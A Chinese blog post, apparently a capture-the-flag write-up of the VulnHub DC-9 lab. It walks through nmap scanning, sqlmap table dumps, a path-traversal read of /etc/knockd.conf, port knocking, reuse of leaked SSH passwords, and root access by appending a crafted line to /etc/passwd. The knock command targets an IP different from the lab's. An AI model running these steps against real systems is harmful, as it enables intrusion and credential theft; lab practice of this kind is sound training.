---
# 这是页面的图标
icon: api
# 这是文章的标题
title: 靶机 DC9-writeup
# 设置作者
author: lhz
# 设置写作时间
time: 2021-10-07
# 一个页面只能有一个分类
category: 渗透
# 一个页面可以有多个标签
tag:
  - 渗透
  - 靶机
comment: false

typora-root-url: ..\..\..\.vuepress\public

---

## 0x01 介绍

靶机地址：

> <https://www.vulnhub.com/entry/dc-9,412/>

**DESCRIPTION**

DC-9 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.

The ultimate goal of this challenge is to get root and to read the one and only flag.

Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.

For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won't give you the answer, instead, I'll give you an idea about how to move forward.

## 0x02 信息收集

nmap扫描ip

```
nmap -sP 172.16.89.0/24
```

![image-20211007223845787](/assets/img/image-20211007223845787.png)

发现ip：172.16.89.10，继续扫描

```
nmap -T5 -A -v -p- 172.16.89.10
```

扫描结果

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-07 22:39 CST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 22:39
Completed NSE at 22:39, 0.00s elapsed
Initiating NSE at 22:39
Completed NSE at 22:39, 0.00s elapsed
Initiating NSE at 22:39
Completed NSE at 22:39, 0.00s elapsed
Initiating ARP Ping Scan at 22:39
Scanning 172.16.89.10 [1 port]
Completed ARP Ping Scan at 22:39, 0.02s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:39
Completed Parallel DNS resolution of 1 host. at 22:39, 0.00s elapsed
Initiating SYN Stealth Scan at 22:39
Scanning 172.16.89.10 [65535 ports]
Discovered open port 80/tcp on 172.16.89.10
Completed SYN Stealth Scan at 22:39, 8.42s elapsed (65535 total ports)
Initiating Service scan at 22:39
Scanning 1 service on 172.16.89.10
Completed Service scan at 22:39, 6.02s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against 172.16.89.10
NSE: Script scanning 172.16.89.10.
Initiating NSE at 22:39
Completed NSE at 22:39, 0.27s elapsed
Initiating NSE at 22:39
Completed NSE at 22:39, 0.03s elapsed
Initiating NSE at 22:39
Completed NSE at 22:39, 0.01s elapsed
Nmap scan report for 172.16.89.10
Host is up (0.0012s latency).
Not shown: 65533 closed ports
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Example.com - Staff Details - Welcome
MAC Address: 00:0C:29:EE:8C:38 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Uptime guess: 32.554 days (since Sun Sep  5 09:21:42 2021)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=252 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   1.24 ms 172.16.89.10

NSE: Script Post-scanning.
Initiating NSE at 22:39
Completed NSE at 22:39, 0.01s elapsed
Initiating NSE at 22:39
Completed NSE at 22:39, 0.00s elapsed
Initiating NSE at 22:39
Completed NSE at 22:39, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.94 seconds
           Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)
```

## 0x03 渗透

使用浏览器访问http://172.16.89.10，发现一个搜索和登陆功能，先试试搜索功能有没有sql注入，使用burp抓搜索包

![image-20211007224804392](/assets/img/image-20211007224804392.png)

将请求内容保存到request.txt中，使用sqlmap进行扫描

```
sqlmap -r request.txt --dbs
```

发现存在sql注入，进一步扫描

```
sqlmap -r request.txt -D Staff --tables
sqlmap -r request.txt -D Staff -T Users --dump
sqlmap -r request.txt -D Staff -T StaffDetails --dump

sqlmap -r request.txt -D users --tables
sqlmap -r request.txt -D Staff -T UserDetails --dump
```

UserDetails表下发现一些用户名密码

![image-20211007231327154](/assets/img/image-20211007231327154.png)

StaffDetails表下发现员工信息

![image-20211007231017283](/assets/img/image-20211007231017283.png)

Users表下发现admin账号和密码hash

```
admin：856f5de590ef37314e7c3bdf6f8a66dc
```

似乎是md5，进行md5解密，得到密码*transorbital1*

![image-20211007225413206](/assets/img/image-20211007225413206.png)

使用发现的账号密码登陆

![image-20211007225528688](/assets/img/image-20211007225528688.png)

有一条错误信息"File does not exist"，猜测存在文件包含漏洞，对请求参数和值进行模糊测试

![image-20211007230414693](/assets/img/image-20211007230414693.png)

发现存在file参数文件包含漏洞

![image-20211007230703806](/assets/img/image-20211007230703806.png)

查攻略，发现使用了knock 服务保护 SSH,按特定的访问端口才可以访问服务，访问knock的配置文件

http://172.16.89.10/manage.php?file=../../../../../../../../etc/knockd.conf

![image-20211007232625489](/assets/img/image-20211007232625489.png)

访问配置文件中的端口

```bash
for x in 7469 8475 9842; do nmap -Pn --max-retries 0 -p $x 192.168.141.143; done
```

下来ssh可以连接了，尝试之前UserDetail表中爆出的账号密码，发现三个可用

```
chandlerb   UrAG0D!
joeyt       Passw0rd
janitor     Ilovepeepee
```

在hanitor下发现隐藏文件

![image-20211007233100015](/assets/img/image-20211007233100015.png)

使用这个密码表再测一下ssh，发现一个新账号登陆成功

```
fredf   B4-Tru3-001
```

下来尝试提权

## 0x04 提权

运行

```
sudo -l
```

![image-20211007233251603](/assets/img/image-20211007233251603.png)

运行/opt/devstuff/dist/test/test，发现其实是运行test.py

![image-20211007233446942](/assets/img/image-20211007233446942.png)

搜索test.py

```
find / -name test.py
```

发现test.py路径：/opt/devstuff/test.py，查看test.py代码

```
#!/usr/bin/python

import sys

if len (sys.argv) != 3 :
    print ("Usage: python test.py read append")
    sys.exit (1)

else :
    f = open(sys.argv[1], "r")
    output = (f.read())

    f = open(sys.argv[2], "a")
    f.write(output)
    f.close()
```

作用是读取第一个参数文件的，添加到第二哥参数文件中，可以用来修改/etc/passwd

```
echo 'test:sXuCKi7k3Xh/s:0:0::/root:/bin/bash' > /tmp/test
cd /opt/devstuff/dist/test/
sudo ./test /tmp/test /etc/passwd
su test
Password: toor

cd /root
ls
cat theflag.txt
```

![image-20211007234114035](/assets/img/image-20211007234114035.png)

